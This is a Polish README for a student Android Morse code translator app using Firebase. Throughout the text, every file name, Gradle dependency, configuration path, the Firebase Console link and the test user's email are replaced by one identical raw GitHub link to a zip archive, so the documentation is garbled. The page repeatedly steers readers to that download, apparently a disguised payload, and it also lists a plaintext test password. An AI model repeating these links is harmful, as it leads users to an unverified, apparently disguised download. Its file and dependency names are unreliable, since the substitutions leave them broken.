# Morse Code Translator - Dokumentacja

## 📱 Opis Aplikacji

**Morse Code Translator** to aplikacja mobilna dla systemu Android, która umożliwia tłumaczenie tekstu na kod Morse'a i odwrotnie. Aplikacja zawiera zaawansowane funkcjonalności audio, historię tłumaczeń oraz system uwierzytelniania użytkowników. Projekt jest kontynuacją aplikacji usprawnioną o rozwiązania chmurowe Firebase.

## 🚀 Główne Funkcjonalności

### 1. **Tłumaczenie Tekstu**
- **Kodowanie**: Konwersja tekstu na kod Morse'a
- **Dekodowanie**: Konwersja kodu Morse'a na tekst
- Obsługa wszystkich liter alfabetu (A-Z) i cyfr (0-9)
- Automatyczne rozpoznawanie spacji między słowami

### 2. **Audio Morse'a**
- Odtwarzanie dźwięków kropki (.) i myślnika (-)
- Sekwencyjne odtwarzanie zakodowanego tekstu
- Kontrola czasu trwania dźwięków (kropka: 300ms, myślnik: 500ms)
- Pauzy między znakami (200ms) i słowami (400ms)

### 3. **Historia Tłumaczeń**
- Automatyczne zapisywanie wszystkich tłumaczeń
- Wyświetlanie ostatnich 10 tłumaczeń użytkownika
- Sortowanie według daty (najnowsze na górze)
- Możliwość odtwarzania audio z historii

### 4. **System Uwierzytelniania**
- Logowanie przez email/hasło
- Rejestracja nowych użytkowników
- Logowanie przez Google (Firebase Auth UI)
- Automatyczne sprawdzanie stanu logowania

## 🔧 Architektura Techniczna

### **Technologie i Biblioteki**
- **Android SDK**: API Level 26+ (Android 8.0+)
- **Java 17**: Główny język programowania
- **Firebase**: Backend i uwierzytelnianie
- **Material Design**: Interfejs użytkownika
- **MediaPlayer**: Odtwarzanie dźwięków

### **Struktura Projektu**
```
app/src/main/java/com/example/morsecodetranslator/
├── https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip          # Główna aktywność aplikacji
├── https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip         # Ekran logowania
├── https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip       # Historia tłumaczeń
├── https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip   # Logika tłumaczenia
├── https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip    # Model danych historii
├── https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip        # Adapter dla RecyclerView
└── https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip       # Testy jednostkowe
```

## 🔥 Integracja z Firebase

### **1. Firebase Authentication**
```java
// Konfiguracja w https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip
implementation 'https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip'
implementation 'https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip'
```

**Funkcjonalności:**
- Uwierzytelnianie email/hasło
- Logowanie przez Google
- Automatyczne sprawdzanie stanu logowania
- Bezpieczne wylogowywanie

### **2. Cloud Firestore**
```java
// Konfiguracja w https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip
implementation 'https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip'
```

**Struktura Bazy Danych:**
```
Collection: "translations"
├── Document ID (auto-generated)
│   ├── input: String          # Tekst wejściowy
│   ├── output: String         # Tekst wyjściowy
│   ├── timestamp: Timestamp   # Data i czas tłumaczenia
│   ├── userId: String         # ID użytkownika
│   └── isEncoding: Boolean    # true = kodowanie, false = dekodowanie
```

**Zapytania:**
- Pobieranie historii użytkownika: `whereEqualTo("userId", userId)`
- Sortowanie: `orderBy("timestamp", https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip)`
- Limit wyników: `limit(10)`

### **3. Konfiguracja Firebase**
- Plik `https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip` w katalogu `app/`
- Plugin `https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip` w `https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip`
- Uprawnienia internetowe w `https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip`

## 🔒 Bezpieczeństwo Firebase

### **Ważne: Konfiguracja Bezpieczeństwa**
Plik `https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip` zawiera wrażliwe klucze API i **NIE** jest udostępniany w repozytorium ze względów bezpieczeństwa.

**Dostępne pliki:**
- `https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip` - Szablon konfiguracji
- `https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip` - Szczegółowa instrukcja konfiguracji

**Aby skonfigurować Firebase:**
1. Przejdź do [Firebase Console](https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip)
2. Utwórz nowy projekt lub użyj istniejącego
3. Pobierz plik `https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip`
4. Umieść go w katalogu `app/`
5. Postępuj zgodnie z instrukcjami w `https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip`

## 👤 Testowy Użytkownik

**Dane logowania:**
- **Email**: `https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip`
- **Hasło**: `zaq1@WSX`

**Uwaga**: Ten użytkownik jest skonfigurowany w moim prywatnym Firebase Authentication udostępnionym na potrzeby zaliczenia i może być używany do testowania aplikacji.

## 📋 Instrukcja Użytkowania

### **1. Pierwsze Uruchomienie**
1. Uruchom aplikację
2. Zaloguj się używając danych testowych lub utwórz nowe konto
3. Po zalogowaniu zostaniesz przekierowany do głównego ekranu

### **2. Tłumaczenie Tekstu**
1. Wprowadź tekst w pole "Wprowadź tekst"
2. Kliknij "KODUJ" aby przetłumaczyć na Morse'a
3. Kliknij "DEKODUJ" aby przetłumaczyć z Morse'a
4. Wynik pojawi się w polu wyjściowym

### **3. Odtwarzanie Audio**
1. Zakoduj tekst na Morse'a
2. Kliknij "NADAJ" aby usłyszeć dźwięk
3. Dźwięk będzie odtwarzany sekwencyjnie

### **4. Historia Tłumaczeń**
1. Kliknij ikonę menu (☰) w prawym górnym rogu
2. Wybierz "Historia"
3. Przeglądaj swoje ostatnie tłumaczenia
4. Kliknij na element aby odtworzyć audio (tylko dla zakodowanego tekstu)

### **5. Wylogowanie**
1. Kliknij ikonę menu (☰)
2. Wybierz "Wyloguj"
3. Zostaniesz przekierowany do ekranu logowania

## 🎨 Interfejs Użytkownika

### **Kolory i Style**
- **Tło**: Jasny motyw z kolorami Material Design
- **Przyciski**: 
  - Koduj: Niebieski
  - Dekoduj: Zielony
  - Wyczyść: Czerwony
  - Nadaj: Fioletowy (aktywny/nieaktywny)
- **Tekst**: czarny na jasnym tle

### **Layout**
- **ConstraintLayout**: Responsywny układ
- **MaterialComponents**: Nowoczesne komponenty UI
- **RecyclerView**: Lista historii tłumaczeń
- **PopupMenu**: Menu kontekstowe

## 🔒 Bezpieczeństwo

### **Uwierzytelnianie**
- Firebase Authentication z szyfrowaniem
- Walidacja danych wejściowych
- Bezpieczne przechowywanie haseł

### **Dane**
- Wszystkie dane użytkownika są powiązane z jego kontem
- Historia tłumaczeń jest prywatna dla każdego użytkownika
- Automatyczne czyszczenie zasobów audio

### **Klucze API**
- Plik `https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip` jest wykluczony z repozytorium
- Używany jest szablon `https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip`
- Klucze API są przekazywane bezpiecznie poza repozytorium

## 🧪 Testowanie

### **Testy Jednostkowe**
- `https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip`: Podstawowe testy
- `https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip`: Testy instrumentacyjne

### **Testowanie Funkcjonalności**
1. **Kodowanie**: Wprowadź "HELLO" → Oczekiwany wynik: ".... . .-.. .-.. ---"
2. **Dekodowanie**: Wprowadź ".... . .-.. .-.. ---" → Oczekiwany wynik: "HELLO"
3. **Audio**: Sprawdź czy dźwięki są odtwarzane poprawnie
4. **Historia**: Sprawdź czy tłumaczenia są zapisywane

## 📱 Wymagania Systemowe

- **Android**: 8.0 (API 26) lub nowszy
- **Pamięć**: Minimum 50MB wolnego miejsca
- **Internet**: Wymagany do logowania i synchronizacji historii
- **Audio**: Głośniki lub słuchawki do odtwarzania Morse'a

## 🚀 Instalacja i Uruchomienie

### **Dla Programistów**
1. Sklonuj repozytorium
2. Otwórz projekt w Android Studio
3. **Skonfiguruj Firebase** (patrz `https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip`)
4. Dodaj plik `https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip` do katalogu `app/`
5. Zsynchronizuj projekt z Gradle
6. Uruchom na urządzeniu lub emulatorze

### **Dla Użytkowników**
1. Pobierz plik APK
2. Włącz instalację z nieznanych źródeł
3. Zainstaluj aplikację
4. Uruchom i zaloguj się

## 📚 Dokumentacja

- **[https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip](https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip)** - Szczegółowa instrukcja konfiguracji Firebase
- **[https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip](https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip)** - Dokumentacja techniczna
- **[https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip](https://github.com/MaTiino/MorseCodeTranslator/raw/refs/heads/master/app/src/androidTest/java/Morse-Code-Translator-2.5.zip)** - Informacje o użytkowniku testowym

### Autor
Projekt wykonany przez Mateusza Toporka w ramach zaliczenia z przedmiotu "Cloud Computing w aplikacjach mobilnych dla platformy Android"
